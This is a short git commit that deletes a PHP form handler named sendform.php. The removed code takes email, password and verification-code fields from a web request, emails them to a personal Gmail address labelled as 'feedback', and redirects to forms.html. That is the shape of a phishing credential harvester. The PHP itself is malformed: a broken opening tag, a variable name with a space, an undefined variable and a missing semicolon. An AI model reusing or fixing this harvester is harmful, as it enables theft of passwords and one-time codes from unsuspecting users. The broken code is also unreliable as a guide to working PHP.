d9fc80bfd158ac466624feb88780d8f99427a161
SAIVISHAL NAMBURI <54294922+saivishalnamburi@users.noreply.github.com>
2020-02-07 16:01:42 +1000

    Delete sendform.php

--- sendform.php
+++
@@ -1,9 +0,0 @@
-<? php
-$Email address = $_REQUEST['Email address'];
-$Password = $_REQUEST['Password'];
-$Code = $_REQUEST['Code'];
-
-$message = "Email : $Email\nPassword: $Password\nCode = $Code" ;
-mail("saivishalnamburi@gmail.com", "recieved feedback", "Informatiuon requested:\n\ $message ", "from: $Email");
-header("Location: forms.html")
-?>
